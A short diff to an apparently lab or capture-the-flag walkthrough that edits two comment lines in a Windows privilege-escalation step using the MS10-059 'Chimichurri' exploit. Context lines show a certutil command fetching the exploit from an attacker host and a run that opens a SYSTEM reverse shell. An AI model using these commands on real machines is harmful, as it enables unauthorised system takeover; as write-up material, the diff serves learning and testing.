@@ -290,7 +290,7 @@
 
     [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
 
-// Download the [ms10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)
+// Download the [ms10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe) file.
 
 	C:\Users\tolis\Desktop\tmp> certutil.exe -urlcache -split -f http://10.10.17.8/MS10-059.exe
 	****  Online  ****
@@ -312,7 +312,7 @@
 		       1 File(s)        784.384 bytes
 		       2 Dir(s)  33.180.422.144 bytes free
 
-// Run ms10-059.exe with <IP> & <PORT>
+// Run ms10-059.exe with IP & PORT
 
 	C:\Users\tolis\Desktop\tmp> ms10-059.exe 10.10.17.8 443
 	/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
